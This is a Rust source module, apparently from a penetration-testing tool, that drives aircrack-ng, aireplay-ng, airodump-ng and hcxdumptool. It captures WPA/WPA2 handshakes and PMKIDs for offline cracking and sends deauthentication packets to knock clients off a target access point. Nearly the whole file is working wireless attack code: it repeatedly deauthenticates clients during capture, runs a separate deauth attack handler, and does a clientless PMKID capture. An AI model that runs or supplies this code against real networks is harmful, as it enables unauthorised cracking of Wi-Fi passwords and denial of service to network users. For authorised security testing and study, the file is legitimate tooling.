//! WPA Handshake and PMKID Capture
//!
//! Captures WPA/WPA2 4-way handshakes and PMKID for offline cracking.

#![allow(dead_code)]

use std::process::Stdio;
use tokio::process::Command;
use tokio::sync::mpsc;
use chrono::Utc;
use anyhow::{Result, Context};

use super::types::*;

/// Handshake capture manager
pub struct HandshakeCapturer {
    interface: String,
    capture_dir: String,
}

impl HandshakeCapturer {
    pub fn new(interface: &str) -> Self {
        Self {
            interface: interface.to_string(),
            capture_dir: "/tmp/heroforge_captures".to_string(),
        }
    }

    /// Set custom capture directory
    pub fn with_capture_dir(mut self, dir: &str) -> Self {
        self.capture_dir = dir.to_string();
        self
    }

    /// Ensure capture directory exists
    async fn ensure_capture_dir(&self) -> Result<()> {
        tokio::fs::create_dir_all(&self.capture_dir).await?;
        Ok(())
    }

    /// Send deauthentication packets to force handshake
    pub async fn send_deauth(
        &self,
        bssid: &str,
        client: Option<&str>,
        count: u32,
    ) -> Result<()> {
        let mut args = vec![
            "--deauth".to_string(),
            count.to_string(),
            "-a".to_string(),
            bssid.to_string(),
        ];

        // Target specific client or broadcast
        if let Some(client_mac) = client {
            args.push("-c".to_string());
            args.push(client_mac.to_string());
        }

        args.push(self.interface.clone());

        let output = Command::new("aireplay-ng")
            .args(&args)
            .output()
            .await
            .context("Failed to run aireplay-ng")?;

        if !output.status.success() {
            let stderr = String::from_utf8_lossy(&output.stderr);
            // Some warnings are OK
            if !stderr.contains("No such BSSID available") {
                log::warn!("aireplay-ng warning: {}", stderr);
            }
        }

        Ok(())
    }

    /// Capture WPA handshake for a specific network
    pub async fn capture_handshake(
        &self,
        config: &CaptureConfig,
        progress_tx: Option<mpsc::Sender<String>>,
    ) -> Result<super::types::HandshakeCapture> {
        self.ensure_capture_dir().await?;

        let capture_id = uuid::Uuid::new_v4().to_string();
        let capture_prefix = format!("{}/handshake_{}", self.capture_dir, capture_id);

        // Start airodump-ng on specific channel and BSSID
        let mut airodump = Command::new("airodump-ng")
            .args([
                "--bssid", &config.bssid,
                "--channel", &config.channel.to_string(),
                "--write", &capture_prefix,
                "--output-format", "pcap",
                &self.interface,
            ])
            .stdout(Stdio::piped())
            .stderr(Stdio::piped())
            .spawn()
            .context("Failed to start airodump-ng")?;

        // Send progress updates
        if let Some(tx) = &progress_tx {
            let _ = tx.send("Started capture, waiting for handshake...".to_string()).await;
        }

        // If deauth is enabled, send deauth packets periodically
        let deauth_handle = if config.deauth_enabled {
            let interface = self.interface.clone();
            let bssid = config.bssid.clone();
            let count = config.deauth_count;

            Some(tokio::spawn(async move {
                let capturer = HandshakeCapturer::new(&interface);
                for _ in 0..3 {
                    tokio::time::sleep(tokio::time::Duration::from_secs(5)).await;
                    let _ = capturer.send_deauth(&bssid, None, count).await;
                }
            }))
        } else {
            None
        };

        // Wait for timeout or handshake capture
        let timeout = tokio::time::Duration::from_secs(config.timeout_secs as u64);
        let capture_file = format!("{}-01.cap", capture_prefix);

        let start_time = std::time::Instant::now();
        let mut _handshake_captured = false;

        loop {
            if start_time.elapsed() >= timeout {
                break;
            }

            // Check if handshake was captured using aircrack-ng
            if tokio::fs::metadata(&capture_file).await.is_ok() {
                if let Ok(has_handshake) = Self::check_handshake(&capture_file).await {
                    if has_handshake {
                        _handshake_captured = true;
                        if let Some(tx) = &progress_tx {
                            let _ = tx.send("Handshake captured!".to_string()).await;
                        }
                        break;
                    }
                }
            }

            tokio::time::sleep(tokio::time::Duration::from_secs(2)).await;
        }

        // Stop processes
        airodump.kill().await.ok();
        if let Some(handle) = deauth_handle {
            handle.abort();
        }

        // Count EAPOL messages
        let eapol_count = Self::count_eapol_messages(&capture_file).await.unwrap_or(0);

        let result = super::types::HandshakeCapture {
            id: capture_id,
            bssid: config.bssid.clone(),
            ssid: String::new(), // Would need to parse from capture
            client_mac: String::new(),
            capture_file,
            eapol_messages: eapol_count,
            is_complete: eapol_count >= 4,
            cracked: false,
            password: None,
            captured_at: Utc::now(),
            cracked_at: None,
        };

        Ok(result)
    }

    /// Check if capture file contains valid handshake
    async fn check_handshake(capture_file: &str) -> Result<bool> {
        let output = Command::new("aircrack-ng")
            .args([capture_file])
            .output()
            .await
            .context("Failed to run aircrack-ng")?;

        let stdout = String::from_utf8_lossy(&output.stdout);

        // Look for handshake indication
        Ok(stdout.contains("1 handshake") || stdout.contains("handshakes"))
    }

    /// Count EAPOL messages in capture file
    async fn count_eapol_messages(capture_file: &str) -> Result<u8> {
        let output = Command::new("tshark")
            .args([
                "-r", capture_file,
                "-Y", "eapol",
                "-T", "fields",
                "-e", "eapol.keydes.key_info",
            ])
            .output()
            .await;

        match output {
            Ok(out) => {
                let count = String::from_utf8_lossy(&out.stdout)
                    .lines()
                    .count();
                Ok(count.min(4) as u8)
            }
            Err(_) => Ok(0),
        }
    }

    /// Capture PMKID (clientless attack)
    pub async fn capture_pmkid(
        &self,
        bssid: &str,
        channel: u8,
        timeout_secs: u32,
    ) -> Result<Option<PmkidCapture>> {
        self.ensure_capture_dir().await?;

        let capture_id = uuid::Uuid::new_v4().to_string();
        let capture_file = format!("{}/pmkid_{}.cap", self.capture_dir, capture_id);

        // Use hcxdumptool if available, otherwise fall back to airodump-ng
        let pmkid = if Self::check_hcxdumptool_available().await {
            self.capture_pmkid_hcxdumptool(&capture_file, bssid, channel, timeout_secs).await?
        } else {
            self.capture_pmkid_airodump(&capture_file, bssid, channel, timeout_secs).await?
        };

        Ok(pmkid.map(|p| PmkidCapture {
            id: capture_id,
            bssid: bssid.to_string(),
            ssid: String::new(),
            pmkid: p,
            capture_file,
            cracked: false,
            password: None,
            captured_at: Utc::now(),
        }))
    }

    /// Check if hcxdumptool is available
    async fn check_hcxdumptool_available() -> bool {
        Command::new("hcxdumptool")
            .arg("--version")
            .output()
            .await
            .map(|o| o.status.success())
            .unwrap_or(false)
    }

    /// Capture PMKID using hcxdumptool
    async fn capture_pmkid_hcxdumptool(
        &self,
        capture_file: &str,
        bssid: &str,
        _channel: u8,
        timeout_secs: u32,
    ) -> Result<Option<String>> {
        // Create filter file for target BSSID
        let filter_file = format!("{}.filter", capture_file);
        let bssid_bytes = bssid.replace(":", "");
        tokio::fs::write(&filter_file, &bssid_bytes).await?;

        let mut child = Command::new("hcxdumptool")
            .args([
                "-i", &self.interface,
                "-o", capture_file,
                "--filterlist_ap", &filter_file,
                "--filtermode=2",
                "--enable_status=1",
            ])
            .stdout(Stdio::piped())
            .stderr(Stdio::piped())
            .spawn()
            .context("Failed to start hcxdumptool")?;

        // Wait for timeout
        tokio::time::sleep(tokio::time::Duration::from_secs(timeout_secs as u64)).await;
        child.kill().await.ok();

        // Extract PMKID from capture
        let pmkid = self.extract_pmkid_from_capture(capture_file).await?;

        // Cleanup
        let _ = tokio::fs::remove_file(&filter_file).await;

        Ok(pmkid)
    }

    /// Capture PMKID using airodump-ng (less reliable)
    async fn capture_pmkid_airodump(
        &self,
        capture_file: &str,
        bssid: &str,
        channel: u8,
        timeout_secs: u32,
    ) -> Result<Option<String>> {
        let prefix = capture_file.strip_suffix(".cap").unwrap_or(capture_file);

        let mut child = Command::new("airodump-ng")
            .args([
                "--bssid", bssid,
                "--channel", &channel.to_string(),
                "--write", prefix,
                "--output-format", "pcap",
                &self.interface,
            ])
            .stdout(Stdio::null())
            .stderr(Stdio::null())
            .spawn()
            .context("Failed to start airodump-ng")?;

        tokio::time::sleep(tokio::time::Duration::from_secs(timeout_secs as u64)).await;
        child.kill().await.ok();

        // Try to extract PMKID
        let actual_file = format!("{}-01.cap", prefix);
        self.extract_pmkid_from_capture(&actual_file).await
    }

    /// Extract PMKID from capture file using hcxpcapngtool
    async fn extract_pmkid_from_capture(&self, capture_file: &str) -> Result<Option<String>> {
        let pmkid_file = format!("{}.pmkid", capture_file);

        let output = Command::new("hcxpcapngtool")
            .args([
                "-o", &pmkid_file,
                capture_file,
            ])
            .output()
            .await;

        if let Ok(out) = output {
            if out.status.success() {
                if let Ok(content) = tokio::fs::read_to_string(&pmkid_file).await {
                    let _ = tokio::fs::remove_file(&pmkid_file).await;
                    if !content.is_empty() {
                        // Return first PMKID found
                        return Ok(content.lines().next().map(|s| s.to_string()));
                    }
                }
            }
        }

        Ok(None)
    }
}

/// Deauthentication attack handler
pub struct DeauthAttack {
    interface: String,
}

impl DeauthAttack {
    pub fn new(interface: &str) -> Self {
        Self {
            interface: interface.to_string(),
        }
    }

    /// Send deauth packets
    pub async fn execute(&self, config: &DeauthConfig) -> Result<WirelessAttack> {
        let attack_id = uuid::Uuid::new_v4().to_string();
        let started_at = Utc::now();

        let mut args = vec![
            "--deauth".to_string(),
            config.count.to_string(),
            "-a".to_string(),
            config.bssid.clone(),
        ];

        if let Some(ref client) = config.client {
            args.push("-c".to_string());
            args.push(client.clone());
        }

        // Add reason code if non-default
        if config.reason_code != 7 {
            args.push("-r".to_string());
            args.push(config.reason_code.to_string());
        }

        args.push(self.interface.clone());

        let output = Command::new("aireplay-ng")
            .args(&args)
            .output()
            .await
            .context("Failed to run aireplay-ng")?;

        let (status, error) = if output.status.success() {
            (AttackStatus::Success, None)
        } else {
            (AttackStatus::Failed, Some(String::from_utf8_lossy(&output.stderr).to_string()))
        };

        Ok(WirelessAttack {
            id: attack_id,
            attack_type: WirelessAttackType::Deauth,
            target_bssid: config.bssid.clone(),
            target_ssid: None,
            status,
            result: Some(format!("Sent {} deauth packets", config.count)),
            capture_file: None,
            started_at,
            completed_at: Some(Utc::now()),
            error,
        })
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[tokio::test]
    async fn test_handshake_capturer_creation() {
        let capturer = HandshakeCapturer::new("wlan0");
        assert_eq!(capturer.interface, "wlan0");
    }
}
